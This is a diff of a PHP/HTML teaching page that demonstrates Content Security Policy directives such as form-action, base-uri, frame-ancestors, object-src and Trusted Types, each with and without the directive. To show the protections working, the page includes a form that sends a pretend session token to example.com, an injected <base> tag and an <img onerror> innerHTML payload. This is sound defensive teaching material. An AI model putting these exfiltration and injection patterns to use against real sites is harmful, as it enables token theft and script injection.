@@ -39,7 +39,11 @@
     .vlog .empty { color:#7f8c8d; }
     .case { border-left:4px solid #ddd; padding-left:14px; margin-bottom:8px; }
     .case.active { border-left-color:#c0392b; }
-    .navbar-list { flex-wrap:wrap; }
+    .policy-links { display:flex; flex-wrap:wrap; gap:.8rem 2.4rem;
+                    list-style:none; padding-left:0; margin-bottom:2.5rem; }
+    .policy-links .navbar-item { float:none; margin:0; }
+    .policy-links .navbar-link { display:block; padding:.4rem 0; margin-right:0;
+                                 line-height:1.4; }
     .policy { word-break:break-all; }
     .muted { color:#777; font-size:.9em; }
   </style>
@@ -62,7 +66,7 @@
 
   <h5>Directives that do <em>not</em> inherit from <code>default-src</code></h5>
   <p class="muted">Each pair below is the same policy with and without the directive under test.</p>
-  <ul class="navbar-list">
+  <ul class="navbar-list policy-links">
     <li class="navbar-item"><a class="navbar-link" href="?csp=form-action-absent">form-action: absent</a></li>
     <li class="navbar-item"><a class="navbar-link" href="?csp=form-action">form-action: set</a></li>
     <li class="navbar-item"><a class="navbar-link" href="?csp=base-uri-absent">base-uri: absent</a></li>
@@ -74,7 +78,7 @@
   </ul>
 
   <h5>Directives that cover more than you think</h5>
-  <ul class="navbar-list">
+  <ul class="navbar-list policy-links">
     <li class="navbar-item"><a class="navbar-link" href="?csp=object-src-absent">object-src: absent</a></li>
     <li class="navbar-item"><a class="navbar-link" href="?csp=object-src">object-src: none</a></li>
     <li class="navbar-item"><a class="navbar-link" href="?csp=connect-src">connect-src vs strict-dynamic</a></li>
@@ -107,13 +111,15 @@
   <!-- ============================ form-action ============================ -->
   <div class="case <?php echo strpos($csp_option, 'form-action') === 0 ? 'active' : ''; ?>">
     <h2>form-action <span class="status status-wait" id="s-form">submit to test</span></h2>
-    <p><code>form-action</code> restricts where a form may submit. It is a
-      <em>navigation</em> directive, not a fetch directive, so it does
-      <strong>not</strong> fall back to <code>default-src</code>.</p>
-    <p>The form below posts to an off-site host. Under
-      <a href="?csp=form-action-absent"><code>default-src 'self'</code> alone</a>
-      it submits happily, with nothing in the console. Only
-      <a href="?csp=form-action"><code>form-action 'self'</code></a> stops it.</p>
+    <p><strong>What happens:</strong> The form sends its fields to
+      <code>example.com</code>. With
+      <a href="?csp=form-action-absent"><code>form-action</code> absent</a>, a
+      new tab opens and the submitted values appear in its URL. With
+      <a href="?csp=form-action"><code>form-action 'self'</code></a>, the browser
+      cancels that navigation and records a violation.</p>
+    <p><strong>Why:</strong> Form submission is a navigation, not a resource
+      fetch. <code>default-src</code> therefore does not restrict it; an explicit
+      <code>form-action</code> directive does.</p>
     <form id="exfil" method="GET" action="https://example.com/collect" target="_blank">
       <input type="hidden" name="session" value="pretend-this-is-a-token">
       <label>Data an attacker would like to have
@@ -130,23 +136,24 @@
   <!-- ============================== base-uri ============================= -->
   <div class="case <?php echo strpos($csp_option, 'base-uri') === 0 ? 'active' : ''; ?>">
     <h2>base-uri <span class="status status-wait" id="s-base">&hellip;</span></h2>
-    <p>One injected <code>&lt;base&gt;</code> tag reroutes every relative URL on
-      the page &mdash; scripts included. This is how a single injected element
-      escalates into full script control. <code>base-uri</code> also does not
-      inherit from <code>default-src</code>.</p>
-    <p>The image below is written as
+    <p><strong>What happens:</strong> Both cases inject
+      <code>&lt;base href="https://picsum.photos/"&gt;</code>. With
+      <a href="?csp=base-uri-absent"><code>base-uri</code> absent</a>, the browser
+      accepts it and resolves every relative URL against that origin. With
+      <a href="?csp=base-uri"><code>base-uri 'none'</code></a>, the browser
+      ignores the element and records a violation.</p>
+    <p><strong>Why:</strong> <code>default-src</code> can restrict the requests
+      produced after URLs are resolved, but it does not control which document
+      base is accepted. That is the separate job of <code>base-uri</code>.</p>
+    <p><strong>Watch it:</strong> The image below is written as
       <code>&lt;img src="images/moustache-cakes.jpeg"&gt;</code>. Its
       <em>resolved</em> URL is:</p>
     <p><code class="code-block policy" id="base-resolved">&hellip;</code></p>
     <img id="relimg" src="images/moustache-cakes.jpeg" width="208" height="156" alt="relative-path image">
-    <p class="muted">Compare <a href="?csp=base-uri-absent">base-uri absent</a>
-      (URL is hijacked) with <a href="?csp=base-uri">base-uri 'none'</a>
-      (the <code>&lt;base&gt;</code> tag is ignored and a violation fires).</p>
     <p class="muted">On the hijacked page, scroll down: the worker and
       <code>&lt;object&gt;</code> sections have broken too. Even root-relative
       URLs like <code>/demo/assets/worker.js</code> resolve against the injected
-      base's <em>origin</em>, so one tag rerouted every asset on the page. That
-      is the whole attack.</p>
+      base's <em>origin</em>, so the one element reroutes assets across the page.</p>
   </div>
 
   <hr />
@@ -154,10 +161,15 @@
   <!-- =========================== frame-ancestors ========================= -->
   <div class="case <?php echo strpos($csp_option, 'frame-ancestors') === 0 ? 'active' : ''; ?>">
     <h2>frame-ancestors <span class="status status-info" id="s-fa">open the framing test</span></h2>
-    <p>Controls who may embed <em>this</em> page &mdash; the anti-clickjacking
-      directive. It supersedes <code>X-Frame-Options</code>, does not inherit
-      from <code>default-src</code>, and is <strong>silently ignored</strong> if
-      you deliver it in a <code>&lt;meta&gt;</code> tag rather than a header.</p>
+    <p><strong>What happens:</strong> The framing test acts as an attacker's page.
+      It can embed the version with
+      <code>frame-ancestors</code> absent, but
+      <code>frame-ancestors 'none'</code> makes the browser refuse the iframe.</p>
+    <p><strong>Why:</strong> <code>frame-ancestors</code> is enforced by the page
+      being framed and controls who may embed it. <code>default-src</code>
+      controls what that page may load, so it provides no clickjacking
+      protection. This directive must be sent in a response header; browsers
+      ignore it in a <code>&lt;meta&gt;</code> policy.</p>
     <p><a class="button" href="/demo/frame-test.php?csp=frame-ancestors-absent" target="_blank">Framing test: absent</a>
        <a class="button" href="/demo/frame-test.php?csp=frame-ancestors" target="_blank">Framing test: 'none'</a></p>
   </div>
@@ -167,13 +179,14 @@
   <!-- ============================= connect-src =========================== -->
   <div class="case <?php echo $csp_option === 'connect-src' ? 'active' : ''; ?>">
     <h2>connect-src <span class="status status-wait" id="s-connect">click to test</span></h2>
-    <p><code>'strict-dynamic'</code> propagates trust for <strong>script
-      loading only</strong>. It has no effect on <code>connect-src</code>. Ad and
-      analytics tags are mostly beacons, which is exactly the traffic it doesn't
-      cover.</p>
-    <p>The <a href="?csp=connect-src">connect-src case</a> uses the full strict
-      CSP recipe &mdash; nonce plus <code>'strict-dynamic'</code> &mdash; and
-      still blocks this beacon.</p>
+    <p><strong>What happens:</strong> The
+      <a href="?csp=connect-src">active policy</a> allows this page's nonced
+      script to run, but clicking the button still blocks its request to
+      <code>ad.doubleclick.net</code>.</p>
+    <p><strong>Why:</strong> <code>'strict-dynamic'</code> propagates trust only
+      when an allowed script loads another script. A beacon, <code>fetch()</code>,
+      XHR, EventSource or WebSocket is a connection governed separately by
+      <code>connect-src</code>, which this case limits to <code>'self'</code>.</p>
     <p><button class="button-primary" id="beacon">Send beacon to ad.doubleclick.net</button></p>
     <p class="muted">The violation fires before the network request, so this
       works with no internet connection.</p>
@@ -184,16 +197,17 @@
   <!-- ======================== worker-src / child-src ===================== -->
   <div class="case <?php echo strpos($csp_option, 'worker') === 0 ? 'active' : ''; ?>">
     <h2>worker-src <span class="status status-wait" id="s-worker">&hellip;</span></h2>
-    <p><code>worker-src</code> falls back to <code>child-src</code>, then
-      <code>script-src</code>, then <code>default-src</code>. So a
-      <code>child-src</code> entry that looks dead &mdash; because
-      <code>frame-src</code> took over frame duty &mdash; is still the directive
-      deciding whether workers may start.</p>
-    <p><a href="?csp=worker-via-child-src">worker via child-src</a> has no
-      <code>worker-src</code> at all, and the worker runs because
-      <code>child-src 'self'</code> permits it.
-      <a href="?csp=worker-src">worker-src 'none'</a> is the same policy with the
-      specific directive added, and the worker dies.</p>
+    <p><strong>What happens:</strong> This page always tries to start a
+      same-origin worker from the same URL. Under
+      <a href="?csp=worker-via-child-src"><code>child-src 'self'</code></a> it
+      runs because <code>worker-src</code> is absent. Under
+      <a href="?csp=worker-src"><code>worker-src 'none'</code></a> the otherwise
+      identical worker is blocked.</p>
+    <p><strong>Why:</strong> The browser uses the first directive present in the
+      worker fallback chain:<br>
+      <code>worker-src &rarr; child-src &rarr; script-src &rarr; default-src</code>.
+      A specific <code>worker-src</code> therefore replaces, rather than combines
+      with, the broader fallbacks.</p>
     <p class="muted">Note: a worker cannot be loaded cross-origin in the first
       place &mdash; that's same-origin policy, not CSP. This is about whether
       workers run at all, not about which host they come from.</p>
@@ -209,12 +223,15 @@
   <!-- ==================== script-src-attr vs script-src-elem ============= -->
   <div class="case <?php echo $csp_option === 'script-attr' ? 'active' : ''; ?>">
     <h2>script-src-attr vs -elem <span class="status status-wait" id="s-attr">click the button</span></h2>
-    <p>The granular split. A <code>&lt;script&gt;</code> block and an
-      <code>onclick=</code> attribute are governed by different directives, which
-      is why a hash that covers one does nothing for the other.</p>
-    <p>Under <a href="?csp=script-attr">this case</a>,
-      <code>script-src-elem 'self' 'unsafe-inline'</code> lets the page's script
-      blocks run, while <code>script-src-attr 'none'</code> kills the handler:</p>
+    <p><strong>What happens:</strong> Under
+      <a href="?csp=script-attr">this policy</a>, the page's
+      <code>&lt;script&gt;</code> blocks run, but the button's inline
+      <code>onclick=</code> does not. Clicking still updates the status badge
+      because an allowed script also installed a separate
+      <code>addEventListener()</code> handler.</p>
+    <p><strong>Why:</strong> <code>script-src-elem</code> governs script elements,
+      while <code>script-src-attr</code> governs inline event attributes. This
+      policy allows the former and sets the latter to <code>'none'</code>.</p>
     <p><button class="button" id="attrbtn" onclick="window.__attrFired = true; document.getElementById('attr-out').textContent = 'The onclick handler ran.';">Inline onclick= handler</button></p>
     <p><span id="attr-out" class="muted">(handler has not run)</span></p>
   </div>
@@ -224,16 +241,17 @@
   <!-- ============================== object-src =========================== -->
   <div class="case <?php echo strpos($csp_option, 'object-src') === 0 ? 'active' : ''; ?>">
     <h2>object-src <span class="status status-wait" id="s-object">&hellip;</span></h2>
-    <p>Flash is the reason this directive exists, but it is not the reason it's
-      still in the recommended policy. <code>&lt;object&gt;</code> and
-      <code>&lt;embed&gt;</code> load documents that <strong>execute
-      script</strong>, and <code>script-src</code> does not govern them.</p>
-    <p>Both boxes below are same-origin files. Under
-      <a href="?csp=object-src-absent"><code>default-src 'self'</code></a> their
-      scripts run. Anyone who can get an HTML or SVG file onto your origin &mdash;
-      a file upload, a webform attachment &mdash; gets script execution that
-      <code>script-src</code> never sees.
-      <a href="?csp=object-src"><code>object-src 'none'</code></a> closes it.</p>
+    <p><strong>What happens:</strong> Both boxes load same-origin documents that
+      contain script. Under
+      <a href="?csp=object-src-absent"><code>object-src</code> absent</a>,
+      <code>default-src 'self'</code> permits both documents and their scripts
+      run. Under <a href="?csp=object-src"><code>object-src 'none'</code></a>,
+      neither document loads.</p>
+    <p><strong>Why:</strong> The parent page's <code>script-src</code> does not
+      govern a document loaded through <code>&lt;object&gt;</code> or
+      <code>&lt;embed&gt;</code>; the load is selected by <code>object-src</code>.
+      This matters when users can place active HTML or SVG files on your origin,
+      such as through an upload or attachment.</p>
     <div class="row">
       <div class="one-half column">
         <p class="muted">&lt;object type="text/html"&gt;</p>
@@ -252,16 +270,14 @@
   <!-- =========================== two CSP headers ========================= -->
   <div class="case <?php echo $csp_option === 'double-header' ? 'active' : ''; ?>">
     <h2>Two CSP headers <span class="status status-wait" id="s-double">&hellip;</span></h2>
-    <p>Send two <code>Content-Security-Policy</code> headers and both are
-      enforced. The effective policy is their <strong>intersection</strong>, not
-      their union &mdash; a resource must be permitted by every policy in force.</p>
-    <p>This is the operational sting in "your header is not your config": if your
-      CDN or web server sets a policy and Drupal sets another, adding a host in
-      the Drupal admin UI changes nothing, because the other policy still rejects
-      it. Nothing in Drupal will tell you why.</p>
-    <p>Under <a href="?csp=double-header">two CSP headers</a>, the first header
-      allows <code>picsum.photos</code> and the second omits it. The image below
-      is blocked:</p>
+    <p><strong>What happens:</strong> Under
+      <a href="?csp=double-header">this case</a>, the first CSP header allows
+      <code>picsum.photos</code>; the second does not. The external image is
+      therefore blocked.</p>
+    <p><strong>Why:</strong> Browsers enforce every CSP header as a separate
+      policy. A request must satisfy all of them, so their combined effect is an
+      intersection. Adding a source to Drupal's policy cannot relax another
+      policy still being sent by a CDN or web server.</p>
     <img id="extimg" src="https://picsum.photos/208/156" width="208" height="156" alt="external image">
   </div>
 
@@ -270,20 +286,16 @@
   <!-- ===================== upgrade-insecure-requests ====================== -->
   <div class="case <?php echo $csp_option === 'upgrade-insecure' ? 'active' : ''; ?>">
     <h2>upgrade-insecure-requests <span class="status status-wait" id="s-upgrade">&hellip;</span></h2>
-    <p>Rewrites <code>http://</code> subresource URLs to <code>https://</code>
-      before the request is made. Takes no value, and does not inherit from
-      anything.</p>
-    <p><strong>This one has largely been overtaken by the browsers.</strong> The
-      image below is written as <code>src="http://picsum.photos/&hellip;"</code>.
-      Watch the network panel with
-      <a href="?csp=none">no CSP at all</a> and the request still goes out over
-      <code>https</code> &mdash; Chrome auto-upgrades mixed-content images, audio
-      and video on its own, and blocks mixed <em>active</em> content (scripts,
-      iframes, XHR) outright rather than upgrading it.</p>
-    <p>So this directive is worth understanding mainly so you can tell when
-      advice you're reading predates that change. It still does real work for
-      the cases auto-upgrade doesn't cover, and it sends the
-      <code>Upgrade-Insecure-Requests: 1</code> request header.</p>
+    <p><strong>What happens:</strong> The image markup contains an
+      <code>http://</code> URL. On an HTTPS page,
+      <a href="?csp=upgrade-insecure"><code>upgrade-insecure-requests</code></a>
+      rewrites that request to <code>https://</code> before it leaves the
+      browser.</p>
+    <p><strong>Why:</strong> This document directive upgrades insecure
+      subresource URLs; it does not use <code>default-src</code> as a fallback.
+      Modern browsers already auto-upgrade some mixed-content types, including
+      images, so <a href="?csp=none">the no-CSP comparison</a> may look the same.
+      The Network panel shows the URL actually requested.</p>
     <p><code class="code-block policy" id="upgrade-resolved">&hellip;</code></p>
     <img id="httpimg" src="http://picsum.photos/208/156" width="208" height="156" alt="http image">
   </div>
@@ -293,13 +305,16 @@
   <!-- =============================== sandbox ============================= -->
   <div class="case <?php echo $csp_option === 'sandbox' ? 'active' : ''; ?>">
     <h2>sandbox <span class="status status-wait" id="s-sandbox">&hellip;</span></h2>
-    <p>The <code>&lt;iframe sandbox&gt;</code> attribute, applied to a top-level
-      document by a header. <a href="?csp=sandbox">This case</a> sends
-      <code>sandbox allow-scripts</code>, so scripts still run but the document
-      is pushed into an <strong>opaque origin</strong> &mdash; forms are blocked,
-      popups are blocked, and same-origin storage access is gone.</p>
-    <p class="muted">Worth knowing mostly so you recognise what happened when a
-      page mysteriously loses <code>localStorage</code> and cookies.</p>
+    <p><strong>What happens:</strong>
+      <a href="?csp=sandbox">This case</a> sends
+      <code>sandbox allow-scripts</code>. JavaScript still runs, but the document
+      receives an opaque origin, loses same-origin storage access, and cannot
+      submit forms or open popups.</p>
+    <p><strong>Why:</strong> CSP's <code>sandbox</code> applies the restrictions
+      of an <code>&lt;iframe sandbox&gt;</code> to the whole document. It starts with
+      every sandbox restriction enabled; <code>allow-scripts</code> removes only
+      the script restriction. There is no <code>allow-same-origin</code>,
+      <code>allow-forms</code> or <code>allow-popups</code> token here.</p>
     <p>Document origin: <code id="sandbox-origin">&hellip;</code></p>
     <p class="muted">While this case is active, scroll back up and press the
       <strong>form-action</strong> submit button. Nothing happens at all &mdash;
@@ -313,13 +328,15 @@
   <!-- ============================ Trusted Types ========================== -->
   <div class="case <?php echo $csp_option === 'trusted-types' ? 'active' : ''; ?>">
     <h2>Trusted Types <span class="status status-wait" id="s-tt">click to test</span></h2>
-    <p><code>require-trusted-types-for 'script'</code> locks the DOM-XSS sinks.
-      Assigning a plain string to <code>innerHTML</code> throws a
-      <code>TypeError</code> instead of parsing it &mdash; the value has to go
-      through a named policy where you actually sanitise it.</p>
-    <p>This is a different <em>kind</em> of protection from the rest of CSP: it
-      doesn't allow-list sources, it constrains what your own code may do with
-      untrusted strings.</p>
+    <p><strong>What happens:</strong> The button assigns a string containing an
+      <code>&lt;img onerror&gt;</code> payload to <code>innerHTML</code>. With
+      <a href="?csp=trusted-types"><code>require-trusted-types-for 'script'</code></a>,
+      the assignment throws a <code>TypeError</code>; the browser creates no
+      element and the payload cannot run.</p>
+    <p><strong>Why:</strong> Trusted Types does not allow-list network sources.
+      It protects DOM-XSS injection sinks by requiring a typed value such as
+      <code>TrustedHTML</code> instead of a plain string, giving the application
+      an explicit policy where that value can be sanitized.</p>
     <p><button class="button-primary" id="ttbtn">Write &lt;img onerror&gt; to innerHTML</button></p>
     <p><span id="tt-out" class="muted">(not yet attempted)</span></p>
     <div id="tt-sink" style="border:1px dashed #ccc;padding:6px;min-height:28px"></div>
@@ -393,8 +410,9 @@
   }
 
   // --- sandbox ---------------------------------------------------------
-  var sandboxed = (location.origin === 'null' || origin === 'null');
-  text('sandbox-origin', String(location.origin));
+  var documentOrigin = String(window.origin);
+  var sandboxed = documentOrigin === 'null';
+  text('sandbox-origin', documentOrigin);
   set('s-sandbox', sandboxed ? 'ran' : 'wait',
       sandboxed ? 'opaque origin' : 'normal origin');
 
